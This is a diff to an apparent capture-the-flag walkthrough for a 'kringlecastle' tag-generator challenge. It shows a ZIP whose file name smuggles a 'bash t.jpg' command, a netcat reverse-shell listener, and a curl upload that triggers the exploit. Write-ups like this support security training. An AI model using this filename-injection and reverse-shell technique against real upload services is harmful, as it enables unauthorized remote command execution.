@@ -58,10 +58,17 @@ Create the ZIP file for upload:
 ```
 zip joergen.zip \'\`bash\ t.jpg\`\;\'.jpg
 ```
-Start the reverse shell 
+Start the reverse shell listener on your local device:
+```
+nc -lnvp 4444
+```
+Get it started:
+```
+curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbOTY4MjE4NTM1LDkyMjE0NDM1LC0zOTg0OT
-E0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4Nywt
-MTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIwND
-U1ODY1LC0xNjA2MDc4MDQwXX0=
+eyJoaXN0b3J5IjpbMjEwNzUyOTg0Niw5MjIxNDQzNSwtMzk4ND
+kxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3ODcs
+LTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMD
+Q1NTg2NSwtMTYwNjA3ODA0MF19
 -->
